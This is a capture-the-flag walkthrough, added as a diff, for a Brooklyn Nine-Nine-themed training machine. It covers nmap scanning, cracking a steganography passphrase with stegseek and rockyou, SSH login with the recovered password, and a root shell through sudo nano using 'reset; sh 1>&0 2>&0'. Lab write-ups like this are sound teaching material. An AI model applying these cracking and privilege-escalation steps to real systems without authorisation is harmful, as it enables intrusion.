@@ -1,0 +1,63 @@
+//Brooklyn Nine Nine//
+
+{{NMAP SCAN}}
+
+nmap -sV -T4 [machine IP]
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-11 13:08 EST
+Nmap scan report for 10.10.162.212
+Host is up (0.13s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Navigating to http://[machine IP], we get a hidden message in the source code of the page that reads:
+<!-- Have you ever heard of steganography? -->
+
+Go to the image as listed in the source code (http://[machine IP]/brooklyn99.jpg) in order to save it.
+
+In a terminal, let's try steghide to extract whatever is hidden within the image.
+
+steghide extract -sf brooklyn99.jpg
+
+It asks us to enter a passphrase, which we don't have at the moment. Press enter, and it says:
+steghide: can not uncompress data. compressed data is corrupted.
+
+Ignore this, and use stegseek plus the rockyou.txt wordlist to find the passphrase:
+stegseek brooklyn99.jpg rockyou.txt
+
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "[the real answer is here]"
+[i] Original filename: "note.txt".
+[i] Extracting to "brooklyn99.jpg.out".
+
+Running the steghide command again and entering our newly recovered passphrase, we are able to extract a text file called "note.txt".
+
+Holts Password:
+[xxx the real password is here xxx]
+
+Enjoy!!
+
+This is most likely the SSH password, so let's try that:
+
+ssh holt@[machine IP]
+Enter password at the prompt
+
+And we are able to successfully log in. Grab the user.txt flag in your home folder.
+
+Time to escalate our privileges. Sudo -l tells us:
+User holt may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /bin/nano
+    
+According to gtfobins, we see we can abuse this binary by doing:
+
+sudo nano
+^R^X (which is Ctrl-R and Ctrl-X)
+
+It will give you a prompt that asks what command you would like to execute. Type in:
+reset; sh 1>&0 2>&0
+
+Congratulations! root.txt is in /root/    
